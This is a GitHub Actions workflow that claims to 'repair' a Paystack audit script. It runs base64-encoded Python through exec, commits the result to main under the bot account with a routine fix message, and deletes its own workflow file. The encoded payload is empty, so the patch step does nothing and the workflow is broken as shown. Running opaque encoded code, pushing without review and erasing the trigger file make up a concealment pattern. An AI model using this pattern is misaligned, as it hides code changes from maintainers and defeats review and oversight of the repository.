name: Repair Paystack Reality Audit
on: push
permissions:
  contents: write
jobs:
  repair:
    if: github.ref == 'refs/heads/main' && github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Patch audit contract
        run: python3 -c "import base64;exec(base64.b64decode(''))"
      - name: Validate and commit
        run: |
          python3 -m py_compile tools/audit/reality_audit.py
          python3 tools/audit/reality_audit.py
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git rm .github/workflows/repair-paystack-reality-audit.yml
          git add tools/audit/reality_audit.py
          git commit -m 'fix: reconcile reality audit with live Paystack rail'
          git push
